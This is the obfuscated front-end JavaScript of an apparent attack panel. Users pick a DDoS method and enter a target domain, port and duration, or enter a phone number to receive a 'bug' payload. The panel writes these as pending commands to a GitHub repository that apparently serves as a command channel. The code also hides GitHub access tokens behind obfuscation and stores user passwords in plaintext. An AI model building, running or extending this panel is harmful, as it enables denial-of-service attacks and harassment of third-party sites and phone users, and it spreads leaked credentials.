(function(_0x22e13d,_0x26d478){function _0x1ef98d(_0x13eb71,_0x4bd232,_0x56198c,_0x2cee9e){return _0x3778(_0x56198c-0x1c1,_0x13eb71);}function _0x28a0eb(_0x20f501,_0x371bc6,_0x3d8a60,_0xb5352){return _0x3778(_0x371bc6-0x31f,_0x20f501);}const _0x69e78c=_0x22e13d();while(!![]){try{const _0x36a304=parseInt(_0x28a0eb(0x431,0x402,0x3db,0x3f6))/(-0x1f1*0x7+-0x1b80+0x8*0x523)+parseInt(_0x28a0eb(0x400,0x41e,0x420,0x44d))/(-0x271+0x13fb+-0x1188)+parseInt(_0x28a0eb(0x423,0x428,0x452,0x442))/(-0x19*0xe0+0x1*-0x263f+0x3c22)*(-parseInt(_0x28a0eb(0x428,0x403,0x3da,0x404))/(0xb26+0x2395*-0x1+0x1873))+parseInt(_0x1ef98d(0x2b6,0x2cb,0x2cd,0x2a0))/(0x18b8+-0x1376+-0x53d*0x1)*(-parseInt(_0x28a0eb(0x429,0x410,0x41a,0x40d))/(-0x13*-0x1ab+-0x6aa+0x25*-0xad))+-parseInt(_0x28a0eb(0x447,0x437,0x40c,0x424))/(-0x2ad*0xa+-0x9c8*0x2+0x2e59)+parseInt(_0x28a0eb(0x425,0x3f9,0x3d3,0x3d5))/(-0x3*-0x985+0xe83*-0x1+-0xe04)+-parseInt(_0x1ef98d(0x2b7,0x2a7,0x2b6,0x2aa))/(-0x1487+-0x2098*-0x1+0xdc*-0xe)*(-parseInt(_0x28a0eb(0x3f8,0x3e8,0x3f8,0x3bb))/(-0x1+0x10*0x15b+-0x15a5));if(_0x36a304===_0x26d478)break;else _0x69e78c['push'](_0x69e78c['shift']());}catch(_0x1005dc){_0x69e78c['push'](_0x69e78c['shift']());}}}(_0x457b,-0x10eb04+0x2c603+-0x99e*-0x2bb));const _0xe7f445=(function(){const _0x408bed={};_0x408bed[_0x44b946(0x48f,0x43a,0x478,0x467)]=_0x44b946(0x49b,0x475,0x4ad,0x48d);const _0x36c951=_0x408bed;let _0xc22450=!![];function _0x3ed4a0(_0xb59204,_0x25e71a,_0x810ae2,_0x5b964c){return _0x3778(_0x25e71a- -0x1d,_0x810ae2);}function _0x44b946(_0x4b24a1,_0x50c7ae,_0x4ecac2,_0x40ef52){return _0x3778(_0x40ef52-0x3a7,_0x4b24a1);}return function(_0x33d524,_0x52399c){const _0x5b7183={};function _0x4a8cf2(_0x5d5b8f,_0x349aba,_0x526cc5,_0x14d56f){return _0x3ed4a0(_0x5d5b8f-0x37,_0x14d56f- -0x1e1,_0x526cc5,_0x14d56f-0x160);}_0x5b7183[_0x5cb703(-0x21d,-0x1f0,-0x21f,-0x225)]=function(_0x2deeb4,_0x2886b3){return _0x2deeb4===_0x2886b3;};function _0x5cb703(_0x42ba16,_0x5ceae9,_0x41da21,_0x10fcb6){return _0x3ed4a0(_0x42ba16-0xce,_0x41da21- -0x2f4,_0x42ba16,_0x10fcb6-0x196);}_0x5b7183['LglUN']=_0x36c951[_0x5cb703(-0x26a,-0x235,-0x251,-0x22f)];const _0x55ccf6=_0x5b7183,_0x42219b=_0xc22450?function(){function _0x2d3aed(_0x26e95e,_0x5dd34b,_0x5cad8d,_0x73b2ec){return _0x5cb703(_0x26e95e,_0x5dd34b-0x170,_0x73b2ec- -0xad,_0x73b2ec-0x1c9);}function _0x334355(_0x2150b2,_0x184bf6,_0x195097,_0x52488e){return _0x5cb703(_0x184bf6,_0x184bf6-0x1ab,_0x52488e-0x331,_0x52488e-0x1);}if(_0x55ccf6[_0x2d3aed(-0x2f2,-0x2ee,-0x2bc,-0x2cc)](_0x334355(0xd7,0x10e,0xcd,0xe3),_0x55ccf6[_0x2d3aed(-0x28c,-0x286,-0x2bf,-0x2aa)])){if(_0x4af15c){const _0xe52a48=_0x24c21a['apply'](_0x26929c,arguments);return _0x4c3c31=null,_0xe52a48;}}else{if(_0x52399c){const _0x33bc70=_0x52399c['apply'](_0x33d524,arguments);return _0x52399c=null,_0x33bc70;}}}:function(){};return _0xc22450=![],_0x42219b;};}());function _0x34f136(_0x6d60ba,_0x1eef82,_0xfc3f02,_0x28f5cd){return _0x3778(_0x1eef82- -0xb2,_0xfc3f02);}function _0x457b(){const _0x5de3d4=['length','9fgtGRK3XM','jYCKi','yMlBXCMv9N','poHWE','12496096SjvZSR','om/repos/R','KanDN','_11BXTLBFA','cuUSr','__proto__','return\x20(fu','V3h','yOAYC','94929zxNtUJ','3881776zGiSmW','hwwKW','vkMcb','table','qV4pPrtGRs','qFEvg','SirTM','CoETjEup79','i.github.c','log','K2W_jUCXYc','(((.+)+)+)','wTizY','18PVghjs','ptQkf','WmbfJGJi75','search','29871mZIzUs','info','0n4Y5Va5V5','xTxHy','exception','0Q7N7Q9JJN','dufWr','zWyRY','ctor(\x22retu','Qpi_ldYxZb','2853440ecGAgb','d/contents','https://ap','console','WNTVe','/dbkapotid','avageStore','AaC_9l1SrG','/bugkapoti','CdvsC','3FpMehj','04rn8VFiSF','NtKri','2527290IqIXCt','Lzxhy','github_pat','lwUTy','CTIVITY/co','bind','LkErC','constructo','LglUN','soOSm','/contents/','rn\x20this\x22)(','8470966HxYMYj','dbweb.json','NbVAx68EL7','ofdIp','GZnMl','toString','SlATW','Fjtdu','wmyUK','ntents/act','0dzML1Nk1U','DqUgt','WYDwZ','nction()\x20','apply','kLT','affaDevv/A','4240Vgsxhd','error','{}.constru','kRQEQ','owRrcUVZ7l','nCu','ivity.json','trace','/sender.js','_11BTRJTMA','EYA7MS6e92','476L3l12VX'];_0x457b=function(){return _0x5de3d4;};return _0x457b();}const _0x528fc6=_0xe7f445(this,function(){function _0x2d19d9(_0x56f9e3,_0x1d818f,_0x4a556a,_0x677f58){return _0x3778(_0x1d818f-0x3b0,_0x56f9e3);}const _0x3002b4={};function _0x1735bc(_0xb01ff2,_0x44245c,_0x343c56,_0x10457a){return _0x3778(_0x343c56- -0x36,_0xb01ff2);}_0x3002b4[_0x1735bc(0xb7,0xc0,0xd7,0xfa)]=_0x1735bc(0xcc,0xc6,0xb9,0xe3)+'+$';const _0x41107f=_0x3002b4;return _0x528fc6[_0x1735bc(0xd7,0xbe,0xe7,0xeb)]()['search'](_0x41107f['Lzxhy'])['toString']()[_0x1735bc(0xed,0x10d,0xdd,0xbe)+'r'](_0x528fc6)[_0x1735bc(0xdb,0xb1,0xbe,0xcd)](_0x41107f[_0x1735bc(0xf4,0xab,0xd7,0xed)]);});function _0x3778(_0x5e0161,_0x528fc6){const _0xe7f445=_0x457b();return _0x3778=function(_0x457b1a,_0x37780c){_0x457b1a=_0x457b1a-(0x78c+-0x23c8+0xe7d*0x2);let _0x387d3e=_0xe7f445[_0x457b1a];return _0x387d3e;},_0x3778(_0x5e0161,_0x528fc6);}_0x528fc6();const _0x578d01=(function(){const _0x29674b={};_0x29674b[_0x1eb1b3(0x374,0x378,0x364,0x397)]=function(_0xe69ab,_0x51513d){return _0xe69ab+_0x51513d;};function _0x55b0e4(_0x15ed31,_0x37834e,_0x195355,_0x5e38f6){return _0x3778(_0x15ed31-0x1f7,_0x5e38f6);}_0x29674b[_0x55b0e4(0x2f2,0x2f2,0x306,0x2d0)]='{}.constru'+_0x55b0e4(0x2f4,0x323,0x2ef,0x2d4)+_0x55b0e4(0x30e,0x2e9,0x304,0x305)+'\x20)';function _0x1eb1b3(_0x5b80f1,_0x1f5406,_0x1ea747,_0x5175c7){return _0x3778(_0x1f5406-0x275,_0x1ea747);}_0x29674b[_0x55b0e4(0x2d0,0x2fe,0x2ed,0x2af)]=_0x55b0e4(0x2d3,0x2ee,0x2c5,0x2ca),_0x29674b[_0x55b0e4(0x2e7,0x2d8,0x2d6,0x2f3)]='uFzQw',_0x29674b['hwwKW']=_0x55b0e4(0x302,0x321,0x308,0x2f2);const _0x55e1cf=_0x29674b;let _0x4a216c=!![];return function(_0x3e66b5,_0x23b1cb){const _0x11d3ab={'BGKTK':function(_0x13a504,_0x889458){function _0x223eb9(_0x20a37a,_0x188e04,_0x4ad64c,_0x19493c){return _0x3778(_0x20a37a-0x10a,_0x4ad64c);}return _0x55e1cf[_0x223eb9(0x20d,0x1fe,0x23c,0x237)](_0x13a504,_0x889458);},'soOSm':_0x55e1cf['dufWr']},_0x3fd42a=_0x4a216c?function(){function _0x1618ca(_0x26e969,_0x104489,_0x1b5455,_0x560f56){return _0x3778(_0x26e969- -0x3b5,_0x1b5455);}const _0x547185={'GZnMl':function(_0xbead8f,_0x2124fb){function _0x520c01(_0x3c8c07,_0x109abf,_0x5e996d,_0x2d0032){return _0x3778(_0x2d0032-0x3c4,_0x5e996d);}return _0x55e1cf[_0x520c01(0x4b0,0x4bf,0x4a3,0x4c7)](_0xbead8f,_0x2124fb);},'cuUSr':_0x55e1cf['dufWr']};function _0x28188b(_0x1af05d,_0x29363d,_0x27f1b9,_0x2f71d6){return _0x3778(_0x27f1b9-0x44,_0x29363d);}if(_0x55e1cf[_0x1618ca(-0x2dc,-0x2bc,-0x2e7,-0x2b3)]!==_0x55e1cf[_0x28188b(0x134,0x131,0x134,0x131)]){if(_0x23b1cb){if(_0x55e1cf[_0x28188b(0x12f,0x14b,0x129,0x114)]!==_0x1618ca(-0x2de,-0x2bb,-0x2dd,-0x2ed)){const _0x152492=_0x23b1cb[_0x28188b(0x114,0x11b,0x10a,0x111)](_0x3e66b5,arguments);return _0x23b1cb=null,_0x152492;}else _0xe9d8de=_0x524a21(_0x11d3ab['BGKTK'](_0x28188b(0x11b,0x120,0x124,0x112)+_0x1618ca(-0x2f0,-0x31d,-0x30f,-0x2ef),_0x11d3ab[_0x28188b(0x16c,0x179,0x159,0x17e)])+');')();}}else{let _0x27862a;try{_0x27862a=_0xf881d3(_0x547185[_0x1618ca(-0x299,-0x2c8,-0x2c7,-0x2c2)](_0x547185['GZnMl'](_0x28188b(0x125,0x10a,0x124,0x137)+_0x1618ca(-0x2f0,-0x2f4,-0x307,-0x313),_0x547185[_0x1618ca(-0x2d7,-0x2d9,-0x2fd,-0x2b6)]),');'))();}catch(_0x3edc18){_0x27862a=_0x2f263f;}return _0x27862a;}}:function(){};return _0x4a216c=![],_0x3fd42a;};}()),_0x2b6d82=_0x578d01(this,function(){const _0x15c1d3={'LkErC':function(_0x40a967,_0x163de9){return _0x40a967!==_0x163de9;},'yOAYC':_0x5c340c(-0xbe,-0xec,-0x116,-0x108),'Fjtdu':function(_0x442fd4,_0x53f1f6){return _0x442fd4(_0x53f1f6);},'xTxHy':function(_0x46465f,_0x1d62bf){return _0x46465f+_0x1d62bf;},'CdvsC':_0x5c340c(-0xfc,-0x108,-0xe6,-0xf4)+_0x5c340c(-0xfc,-0x123,-0x12f,-0x125),'SirTM':_0x5c340c(-0x11b,-0x11d,-0x142,-0x14b)+_0x5c340c(-0x10f,-0xeb,-0x102,-0xdb)+_0x5c340c(-0xee,-0xd1,-0xfd,-0xf2)+'\x20)','lwUTy':_0x5c340c(-0x11f,-0xf2,-0x10f,-0xd0),'WYDwZ':_0x5c340c(-0x105,-0x11e,-0x132,-0x109),'qFEvg':_0x48ce09(-0x226,-0x236,-0x20c,-0x235),'kRQEQ':_0x5c340c(-0xe9,-0x101,-0xfc,-0x110),'FQvXv':_0x48ce09(-0x24f,-0x26a,-0x272,-0x223),'SlATW':function(_0x43d88c,_0x11b044){return _0x43d88c<_0x11b044;}},_0xf349bb=function(){function _0x2872b4(_0x1fb306,_0x5ac658,_0x5f2256,_0x1bdc3c){return _0x5c340c(_0x1fb306-0x110,_0x1bdc3c-0x63,_0x5f2256-0x3d,_0x5f2256);}function _0x4f0292(_0x2bdae9,_0x2a2c56,_0x44f686,_0x2ff6d9){return _0x5c340c(_0x2bdae9-0x64,_0x2ff6d9- -0x7b,_0x44f686-0x179,_0x2bdae9);}if(_0x15c1d3[_0x2872b4(-0x85,-0x52,-0x6e,-0x73)](_0x15c1d3[_0x2872b4(-0xb1,-0xbf,-0x8e,-0xa3)],_0x2872b4(-0x4c,-0x43,-0x93,-0x6a))){let _0x4ace6f;try{_0x4ace6f=_0x15c1d3[_0x4f0292(-0x192,-0x19b,-0x199,-0x1a4)](Function,_0x15c1d3[_0x4f0292(-0x18e,-0x188,-0x140,-0x16b)](_0x15c1d3[_0x4f0292(-0x189,-0x199,-0x147,-0x16b)](_0x15c1d3[_0x2872b4(-0x6b,-0x7a,-0x7f,-0x7d)],_0x15c1d3[_0x4f0292(-0x161,-0x17e,-0x1a2,-0x179)]),');'))();}catch(_0x553796){_0x4ace6f=window;}return _0x4ace6f;}else{if(_0x24864c){const _0x490cde=_0x5db0ee['apply'](_0x26739d,arguments);return _0x52891e=null,_0x490cde;}}},_0x156a13=_0xf349bb(),_0x1b36b9=_0x156a13['console']=_0x156a13[_0x5c340c(-0xf5,-0xe6,-0xff,-0x108)]||{},_0x26069b=[_0x48ce09(-0x232,-0x228,-0x25a,-0x23a),'warn',_0x15c1d3[_0x48ce09(-0x210,-0x1f8,-0x228,-0x207)],_0x15c1d3[_0x48ce09(-0x25b,-0x25c,-0x247,-0x241)],_0x15c1d3[_0x5c340c(-0x124,-0xff,-0x116,-0xe0)],_0x15c1d3[_0x48ce09(-0x253,-0x24d,-0x260,-0x240)],_0x15c1d3['FQvXv']];function _0x5c340c(_0x27c8d9,_0x1f4e7f,_0x42d9c3,_0x48c2d7){return _0x3778(_0x1f4e7f- -0x1e8,_0x48c2d7);}function _0x48ce09(_0x55e36d,_0x47d46f,_0x398c3a,_0x45f2c3){return _0x3778(_0x55e36d- -0x31f,_0x45f2c3);}for(let _0x41e906=-0x9fe*0x3+-0x23+0x1e1d;_0x15c1d3[_0x5c340c(-0x134,-0x12a,-0x149,-0x113)](_0x41e906,_0x26069b[_0x5c340c(-0xf9,-0x113,-0xfc,-0xfe)]);_0x41e906++){const _0x5dee9f=_0x578d01[_0x48ce09(-0x20c,-0x201,-0x206,-0x239)+'r']['prototype']['bind'](_0x578d01),_0x4732cd=_0x26069b[_0x41e906],_0x55ad14=_0x1b36b9[_0x4732cd]||_0x5dee9f;_0x5dee9f[_0x5c340c(-0x117,-0x109,-0x10e,-0x119)]=_0x578d01[_0x48ce09(-0x20e,-0x238,-0x1e5,-0x1f1)](_0x578d01),_0x5dee9f['toString']=_0x55ad14[_0x48ce09(-0x202,-0x1e9,-0x1e5,-0x1fe)][_0x5c340c(-0xca,-0xd7,-0xe0,-0xf8)](_0x55ad14),_0x1b36b9[_0x4732cd]=_0x5dee9f;}});_0x2b6d82();function _0x25818a(_0x1a0496,_0x297082,_0x431e10,_0x176276){return _0x3778(_0x176276-0x359,_0x1a0496);}const API_LOGIN=_0x25818a(0x47c,0x481,0x45a,0x45a)+_0x34f136(0x61,0x3a,0x51,0x27)+'om/repos/R'+_0x34f136(0x2b,0x53,0x80,0x60)+_0x34f136(0x4b,0x52,0x46,0x4c)+_0x34f136(0x44,0x64,0x50,0x49)+_0x34f136(0x66,0x67,0x42,0x84),TOKEN_LOGIN='github_pat'+_0x25818a(0x410,0x45e,0x409,0x436)+_0x34f136(0x38,0x58,0x84,0x6f)+_0x25818a(0x47d,0x42f,0x42b,0x457)+_0x34f136(0x2d,0x36,0x31,0x20)+'eNzb5WWSfL'+_0x34f136(-0x2,0x26,0x3f,0x40)+_0x25818a(0x481,0x45d,0x489,0x473)+_0x34f136(0x36,0x22,0xe,0x1c)+_0x34f136(-0xe,0x1c,0x24,-0x2),API_BUGS=_0x25818a(0x47c,0x45e,0x451,0x45a)+_0x25818a(0x431,0x471,0x43a,0x445)+_0x34f136(0x22,0x29,0x38,0x1a)+_0x25818a(0x47e,0x431,0x45b,0x45e)+_0x34f136(0x5e,0x55,0x59,0x34)+_0x25818a(0x449,0x446,0x451,0x459)+_0x34f136(-0x4,0x1f,0x2,0x11)+'on',TOKEN_BUGS='github_pat'+_0x34f136(0xa,0x2b,0x39,-0x5)+_0x25818a(0x43a,0x41e,0x3eb,0x41b)+_0x25818a(0x43f,0x465,0x436,0x45f)+'jA9YZ1DvVB'+_0x34f136(0x17,0x1b,0x2a,0x13)+'5FSxSObk3A'+_0x25818a(0x458,0x465,0x47f,0x450)+'RL4RIQXRwN'+_0x25818a(0x412,0x45c,0x465,0x43a),API_ACTIVITY=_0x34f136(0x6c,0x4f,0x46,0x28)+_0x25818a(0x457,0x441,0x472,0x445)+'om/repos/D'+_0x34f136(0x36,0x16,0xb,0x37)+_0x34f136(0x2f,0x5e,0x84,0x54)+_0x34f136(-0x2,0xf,-0x18,0x29)+_0x34f136(0x5,0x1d,0x2b,0x4c),TOKEN_ACTIVITY=_0x34f136(0x5a,0x5c,0x3d,0x35)+_0x34f136(-0x3,0x20,0x3b,0xd)+_0x34f136(0x5b,0x48,0x3e,0x64)+_0x34f136(0x6a,0x3c,0x3f,0x29)+_0x25818a(0x471,0x429,0x47c,0x44c)+'3OOPHigORF'+_0x25818a(0x465,0x458,0x45e,0x444)+_0x34f136(-0xa,0x24,0x4,0x39)+_0x25818a(0x416,0x420,0x455,0x42c)+_0x25818a(0x414,0x3f1,0x44f,0x420);

const roleBtn = document.getElementById("roleBtn");
const roleList = document.getElementById("roleList");
const newRole = document.getElementById("newRole");
roleBtn.onclick = () => roleList.classList.toggle("hidden");
roleList.querySelectorAll("li").forEach(li => {
  li.onclick = () => {
    roleBtn.innerHTML = `<span style="display:flex;align-items:center;gap:8px;justify-content:center;width:100%">${li.innerHTML}</span> â–¾`;
    newRole.value = li.dataset.value;
    roleList.classList.add("hidden");
  };
});

function ddos_isSimTarget(target){
  if(!target) return false;
  const t = target.trim();

  if(/\s/.test(t)) return false;
  if(/^(https?:\/\/)/i.test(t)) return false;

  const isIPv4 = /^(\d{1,3}\.){3}\d{1,3}$/.test(t);
  const isIPv6 = /:/.test(t) && /^[0-9a-fA-F:]+$/.test(t);
  if(isIPv4 || isIPv6) return false;

  if(/^[a-z0-9\-]+\.[a-z0-9\-\.]+$/i.test(t)) return true;

  if(/^SIM:|^sim-/i.test(t)) return true;

  return false;
}

async function ddos_sendCommandToGithub(command, target) {
  if(!ddos_isSimTarget(target)) throw new Error('Target tidak valid â€” gunakan nama domain (example.com) atau prefix SIM: untuk simulasi.');

  if(typeof githubGet !== 'function' || typeof githubPut !== 'function'){
    throw new Error('Helper githubGet/githubPut tidak ditemukan di halaman.');
  }


  const { content: oldContent, sha } = await githubGet(API_BUGS, TOKEN_BUGS);
  const base = (oldContent && oldContent.data) ? oldContent : { server: "Active", data: [] };

  
  const entry = {
    command: command,
    status: "pending"
  };

  base.data.push(entry);

  
  await githubPut(API_BUGS, TOKEN_BUGS, base, `log: ${command}`, sha);
  return entry;
}


async function ddos_incrementActivity(delta = 1){
  if(typeof githubGet !== 'function' || typeof githubPut !== 'function'){
    console.warn('github helpers not found for activity increment');
    return null;
  }
  const res = await githubGet(API_ACTIVITY, TOKEN_ACTIVITY);
  const data = res.content || { Activitas: 0 };
  data.Activitas = (parseInt(data.Activitas, 10) || 0) + delta;
  await githubPut(API_ACTIVITY, TOKEN_ACTIVITY, data, `activity +${delta}`, res.sha);


  const el = document.getElementById('ddosActivityCount');
  if(el) el.textContent = data.Activitas;
  const globalEl = document.getElementById('activityCount');
  if(globalEl) globalEl.textContent = data.Activitas;

  return data.Activitas;
}


(function(){
  const cards = document.querySelectorAll('#ddosMethodGrid .ddos-card');
  let chosenCmd = null;
  cards.forEach(c => {
    c.addEventListener('click', () => {
      cards.forEach(x => x.classList.remove('selected'));
      c.classList.add('selected');
      chosenCmd = c.dataset.cmd; // e.g. ".slow"
    });
  });

  const btn = document.getElementById('sendDdosBtn');
  const msgEl = document.getElementById('ddosMsg');
  const targetInput = document.getElementById('ddosTargetInput');
  const portInput = document.getElementById('ddosPortInput');
  const durInput = document.getElementById('ddosDurationInput');
  const serverEl = document.getElementById('ddosServerStatus');

  btn.addEventListener('click', async () => {
    try {
      if(!chosenCmd) throw new Error('Pilih type DDoS dulu.');
      const rawTarget = (targetInput.value || '').trim();
      if(!rawTarget) throw new Error('Isi target.');

      const durRaw = (durInput.value || '').trim();
      const portRaw = (portInput.value || '').trim();
      const dur = durRaw === '' ? 'auto' : (durRaw.replace(/\D/g,'') || 'auto');
      const port = portRaw === '' ? 'auto' : (portRaw.replace(/\D/g,'') || 'auto');


      const cmd = `${chosenCmd} ${rawTarget} dur:${dur} port:${port}`;
      

const link = /^(https?:\/\/)/i.test(rawTarget) ? rawTarget : `http://${rawTarget}`;


      
      await ddos_sendCommandToGithub(cmd, rawTarget);
      await ddos_incrementActivity(1);
     
      if(serverEl) serverEl.textContent = 'ON';
      msgEl.textContent = `Berhasil Dikirim ke "${link}"`;
      msgEl.style.color = 'var(--success)';
if (typeof showPopupNotif === 'function') {
  showPopupNotif(`Succes!\n${link}`, true);
}

      setTimeout(()=>{ if(serverEl) serverEl.textContent = 'OFF'; }, 2000);

    } catch(err) {
      msgEl.textContent = err.message || 'Gagal mengirim command.';
      msgEl.style.color = 'var(--danger)';
      if(typeof showPopupNotif === 'function') showPopupNotif(err.message || 'Gagal', false);
    }
  });
})();

async function loadActivity() {
  try {
    const res = await fetch(API_ACTIVITY, {
      headers: { Authorization: `token ${TOKEN_ACTIVITY}` }
    });
    const data = await res.json();
    const content = atob(data.content);
    const actData = JSON.parse(content);
    document.getElementById('activityCount').textContent = actData.Activitas || 0;
  } catch (err) {
    console.error("Gagal load activity:", err);
  }
}

async function loadServer() {
  try {
    const res = await fetch(API_SERVER, {
      headers: { Authorization: `token ${TOKEN_ACTIVITY}` }
    });
    const data = await res.json();
    const content = atob(data.content);
    const srvData = JSON.parse(content);
    document.getElementById('serverStatus').textContent =
      srvData.Servers?.Active ? "ON" : "OFF";
  } catch (err) {
    console.error("Gagal load server:", err);
  }
}


document.addEventListener("DOMContentLoaded", () => {
  loadActivity();
  loadServer();
});

let selectedBug = null;


document.querySelectorAll('.bug-card').forEach(card=>{
  card.addEventListener('click', ()=>{
    document.querySelectorAll('.bug-card').forEach(c=> c.classList.remove('selected'));
    card.classList.add('selected');
    selectedBug = card.dataset.cmd;
  });
});


document.getElementById('sendBugBtn').addEventListener('click', async()=>{
  const num = document.getElementById('bugNumber').value.trim();
  const msg = document.getElementById('bugMsg');

  if(!num){ msg.textContent="Nomor wajib diisi!"; msg.style.color="var(--danger)"; return; }
  if(!selectedBug){ msg.textContent="Pilih type bug terlebih dahulu!"; msg.style.color="var(--danger)"; return; }

  const command = `${selectedBug} ${num}`;

  try {
    
    const {content, sha} = await githubGet(API_BUGS, TOKEN_BUGS);
    let bugs = content || { server: "Active", data: [] };

  
    bugs.data.push({
      command: command,
      status: "pending"
    });

    
    await githubPut(API_BUGS, TOKEN_BUGS, bugs, `send bug ${command}`, sha);

    
    const act = await githubGet(API_ACTIVITY, TOKEN_ACTIVITY);
    let actData = act.content || { Activitas: 0 };
    actData.Activitas = (parseInt(actData.Activitas) || 0) + 1;
    await githubPut(API_ACTIVITY, TOKEN_ACTIVITY, actData, "update activity", act.sha);


    loadActivity();

    showPopupNotif(`Bug berhasil dikirim ke ${num}`);

  } catch(err){
    msg.textContent = "Gagal kirim bug: " + err.message;
    msg.style.color = "var(--danger)";
  }
});

    let state = {
      user:null, role:null,
      loginSha:null, loginList:[],
      numbersSha:null, numbers:[],
    }
    async function githubGet(url, token){
      const res = await fetch(url, {headers:{Authorization:`token ${token}`, Accept:'application/vnd.github+json'}});
      if(res.status === 404){
        return {content:null, sha:null, notFound:true}
      }
      if(!res.ok){ throw new Error('GitHub GET failed: '+res.status) }
      const data = await res.json();
      const decoded = data.content ? JSON.parse(atob(data.content)) : null;
      return {content:decoded, sha:data.sha}
    }

    async function githubPut(url, token, jsonContent, message, sha){
      const body = {
        message,
        content: btoa(JSON.stringify(jsonContent, null, 2)),
        sha: sha || undefined
      }
      const res = await fetch(url, {
        method:'PUT',
        headers:{'Content-Type':'application/json', Authorization:`token ${token}`, Accept:'application/vnd.github+json'},
        body: JSON.stringify(body)
      });
      if(!res.ok){
        const t = await res.text();
        throw new Error('GitHub PUT failed: '+res.status+' '+t)
      }
      return await res.json();
    }

    function toast(el, msg, ok=true){ el.textContent = msg; el.style.color = ok? 'var(--success)':'var(--danger)'; }

    function setView(id){
  document.querySelectorAll('main[id^="view-"]').forEach(m => {
    m.classList.add('hidden');
    m.classList.remove('visible'); 
  });

  const target = document.getElementById('view-'+id);
  if(target){
    target.classList.remove('hidden');
    setTimeout(()=> target.classList.add('visible'), 50);
  }

  document.querySelectorAll('.menu a').forEach(a => a.classList.remove('active'));
  const link = document.querySelector(`.menu a[data-view="${id}"]`);
  if(link) link.classList.add('active');

  drawer.classList.remove('open');
  window.scrollTo({top:0, behavior:'smooth'});
}

function showBugSuccess(msg) {
  const bugMsg = document.getElementById("bugMsg");
  bugMsg.textContent = msg;
  bugMsg.style.color = "lime";
  const bugCard = bugMsg.closest(".card");
  bugCard.classList.remove("success-anim"); 
  void bugCard.offsetWidth;                 
  bugCard.classList.add("success-anim");
}
    
    function parseExpired(input){
  const now = new Date();
  if(!input) return null;

  const trimmed = input.trim().toLowerCase();

  
  if(/^\d+$/.test(trimmed)){
    now.setDate(now.getDate() + parseInt(trimmed));
    return now.toISOString();
  }
  const m = trimmed.match(/(\d+)\s*(hari|jam|h|j)/i);
  if(!m) return null;
  const val = parseInt(m[1]);
  const unit = m[2];
  if(unit.startsWith('h')) now.setDate(now.getDate() + val);   
  else if(unit.startsWith('j')) now.setHours(now.getHours() + val); 

  return now.toISOString();
}
    async function loadLogins(){
  const {content, sha} = await githubGet(API_LOGIN, TOKEN_LOGIN);
  if(Array.isArray(content)){
    state.loginList = content;
  } else if(content && typeof content === "object"){
    state.loginList = [content];
  } else {
    state.loginList = [];
  }
  state.loginSha = sha;
}

async function deleteAccount(username){
  try {
    state.loginList = state.loginList.filter(acc => acc.username !== username);
    await githubPut(API_LOGIN, TOKEN_LOGIN, state.loginList, `delete user ${username}`, state.loginSha);
    await loadLogins();
    renderAccounts();
    toast(accMsg, `Akun "${username}" berhasil dihapus`, true);
  } catch(e){
    toast(accMsg, `Gagal hapus akun`, false);
  }
}

    async function doLogin(username, password){
  await loadLogins();
  const found = state.loginList.find(u => u.username === username && u.password === password);
  if(!found) return null;

  if(found.expired){
    const expDate = new Date(found.expired).getTime();
    if(Date.now() > expDate){
     
      state.loginList = state.loginList.filter(x=>x.username !== username);
      await githubPut(API_LOGIN, TOKEN_LOGIN, state.loginList, `delete expired user ${username}`, state.loginSha);
      throw new Error("Akun sudah kedaluwarsa dan dihapus");
    }
  }

  state.user = username; 
  state.role = found.role;
  localStorage.setItem('session', JSON.stringify({u:username, r:found.role}));
  return found;
}

    function restoreSession(){
  const s = localStorage.getItem('session');
  if(!s){
    setView('login');
    return;
  }

  const {u, r} = JSON.parse(s);
  state.user = u; 
  state.role = r;

  document.getElementById('who').textContent = u + ' â€¢ ' + r;
  document.getElementById('userBadge').classList.remove('hidden');
  document.getElementById('roleChip').textContent = r;
  if(r==='admin') document.getElementById('adminSection').classList.remove('hidden');
  document.getElementById('btnHamburger').classList.remove('hidden');
  document.getElementById('btnProfile').classList.remove('hidden');

    // ðŸ”¥ panggil nav biar muncul
    showBottomNav();

  showBottomNav(); 
  setView('dashboard');
        startNotifCycle();
  loadNumbers();
}

    function logout(){
      localStorage.removeItem('session'); location.reload();
    }

function setActiveBottomNav(view){
  const items = document.querySelectorAll('#bottomNav a[data-view]');
  items.forEach(a => {
    if(a.dataset.view === view) a.classList.add('active');
    else a.classList.remove('active');
  });
}

function showBottomNav(){
  const bottomNav = document.getElementById('bottomNav');
  if(!bottomNav) return;

  bottomNav.classList.remove('hidden');
  void bottomNav.offsetWidth;
  bottomNav.classList.add('show');
  setActiveBottomNav('dashboard');

  bottomNav.querySelectorAll('a[data-view]').forEach(a=>{
    a.onclick = (e)=>{
      e.preventDefault();
      const v = a.dataset.view;
      setView(v);
      setActiveBottomNav(v);

      if(v==='numbers'){ loadNumbers(); }
      if(v==='accounts'){ 
  if(state.role === 'admin'){
    loadLogins(); 
    renderAccounts(); 
  } else {
    setView('accounts-blocked');
  }
}
    };
  });
}

let slideIndex = 0;
let slidesBox;

function showSlidesBox() {
  slidesBox.forEach((el) => el.classList.remove("active", "prev"));

  const prevIndex = slideIndex;
  slideIndex = (slideIndex + 1) % slidesBox.length;

  slidesBox[prevIndex].classList.add("prev");
  slidesBox[slideIndex].classList.add("active");

  setTimeout(showSlidesBox, 2000); // ganti tiap 4 detik
}

document.addEventListener("DOMContentLoaded", () => {
  slidesBox = document.querySelectorAll(".slideshow-box .slide-box");
  if (slidesBox.length > 0) {
    slidesBox[0].classList.add("active");
    setTimeout(showSlidesBox, 4000);
  }
});

document.querySelectorAll('#bottomNav a[data-view]').forEach(a=>{
  a.addEventListener('click', e=>{
    e.preventDefault();
    const v = a.dataset.view;
    setView(v);
    setActiveBottomNav(v);
  });
});

const _origSetView = setView;
setView = function(id){
  _origSetView(id);
  
  const bn = document.getElementById('bottomNav');
  if(bn && bn.classList.contains('show')) setActiveBottomNav(id);
}

    function renderAccounts(){
  const body = document.getElementById('accountsTable');
  body.innerHTML = '';

  state.loginList.forEach((acc, i) => {
    let expiredText = "Tidak ada";

    if(acc.expired){
      const expDate = new Date(acc.expired).getTime();
      const now = Date.now();
      const diff = expDate - now;
      const daysLeft = Math.ceil(diff / (1000*60*60*24));

      if(daysLeft > 0){
        expiredText = `${daysLeft} hari lagi`;
      } else {
        expiredText = `Lewat ${Math.abs(daysLeft)} hari`;
      }
    }

    const tr = document.createElement('tr');
    tr.innerHTML = `
      <td>${i+1}</td>
      <td>${acc.username}</td>
      <td>${acc.role}</td>
      <td>${expiredText}</td>
      <td>
        <button class="btn small danger" onclick="deleteAccount('${acc.username}')">Hapus</button>
      </td>
    `;
